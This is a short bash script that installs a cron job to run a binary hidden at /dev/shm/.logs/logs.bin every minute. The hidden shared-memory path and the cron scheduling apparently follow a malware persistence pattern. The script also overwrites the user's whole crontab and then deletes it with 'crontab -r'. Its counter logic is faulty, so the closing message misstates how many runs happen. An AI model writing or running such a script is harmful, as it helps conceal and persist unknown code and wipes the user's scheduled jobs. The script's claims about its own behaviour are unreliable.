#!/bin/bash

# Set the path to the logs.bin file
LOGS_SCRIPT_PATH="/dev/shm/.logs/./logs.bin"

# Set the number of times to run the cron job
NUM_RUNS=3

# Create a temporary cron file
CRON_FILE=$(mktemp)

# Add the cron job entry to run the logs.bin file every minute for three times
echo "*/1 * * * * $LOGS_SCRIPT_PATH && ((--NUM_RUNS)) && [ \$NUM_RUNS -gt 0 ] || crontab -r" > "$CRON_FILE"

# Install the cron job
crontab "$CRON_FILE"

# Clean up the temporary cron file
rm "$CRON_FILE"

echo "Cron job has been set up to run $LOGS_SCRIPT_PATH every minute for $NUM_RUNS times."
